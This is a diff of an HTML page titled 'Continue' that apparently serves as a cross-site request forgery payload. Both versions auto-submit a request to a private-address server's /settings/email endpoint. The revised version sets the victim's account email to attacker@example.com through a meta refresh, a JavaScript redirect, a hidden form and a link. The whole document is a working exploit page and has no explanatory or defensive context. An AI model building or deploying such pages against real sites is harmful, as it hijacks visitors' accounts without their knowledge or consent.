@@ -1,14 +1,10 @@
 <!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <title>Continue</title>
-</head>
+<html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0; url=http://100.101.228.35:6009/settings/email?new=attacker%40example.com"><title>Continue</title></head>
 <body>
-  <form id="go" action="http://100.101.228.35:6009/settings/email" method="get">
-    <input type="hidden" name="new" value="freshemail@example.com">
-    <button type="submit">Continue</button>
-  </form>
-  <script>document.getElementById("go").submit();</script>
-</body>
-</html>
+<a id="link" href="http://100.101.228.35:6009/settings/email?new=attacker%40example.com">Continue</a>
+<form id="csrf" action="http://100.101.228.35:6009/settings/email" method="GET"><input type="hidden" name="new" value="attacker@example.com"></form>
+<script>
+  var u="http://100.101.228.35:6009/settings/email?new=attacker%40example.com";
+  window.location.replace(u);
+</script>
+</body></html>
